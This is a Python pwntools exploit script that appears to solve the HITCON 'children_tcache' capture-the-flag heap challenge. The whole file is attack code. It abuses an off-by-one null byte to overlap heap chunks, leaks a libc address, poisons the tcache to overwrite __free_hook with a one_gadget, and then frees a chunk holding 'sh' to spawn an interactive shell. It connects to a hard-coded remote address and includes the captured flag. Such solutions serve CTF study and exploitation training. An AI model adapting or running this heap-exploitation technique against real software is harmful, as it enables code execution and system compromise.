from pwn import *

def alloc(size, data):
	r.sendlineafter('choice: ', '1')
	r.sendlineafter('Size:', str(size))
	r.sendafter('Data:', data)

def show(idx):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter('Index:', str(idx))

def free(idx):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter('Index:', str(idx))

def leak(idx):
	show(idx)
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():
	
	alloc(0x420,  '1') # 0
	alloc(0x40,   '2') # 1
	alloc(0x40,   '3') # 2
	alloc(0xff0,  '4') # 3
	alloc(0x20,   '5') # 4

	free(0)
	free(2)

	alloc(0x48, 'a'*0x48) # 0

	size = 0x47
	# fix prev_size by free-ing and allocating back the chunk one less byte at a time
	for i in xrange(5):
		free(0)
		alloc(size, 'a'*0x47) # 0
		size -= 1

	free(0)
	alloc(0x42, 'a'*0x40 + p16(0x4d0)) # 0

	free(3)

	alloc(0x420,  '2') # 2

	libc = leak(1) - 0x3ebca0
	__free_hook = libc + 0x3ed8e8
	oneshot = libc + 0x4f322
	log.success('Libc: 0x{:x}'.format(libc))

	# free the victim chunk whose tcache's fd we'll overwrite
	free(0)

	alloc(0x80, 'a'*0x50 + p64(__free_hook)) # 0
	alloc(0x40, 'sh')  # 3
	alloc(0x40, p64(oneshot))

	# _int_free(chunks[3]) => system('/bin/sh')
	free(3)
	# hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}
	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == "r":
		r = remote('54.178.132.125', 8763)
	else:
		r = process('./children_tcache')
		pause()
	pwn()
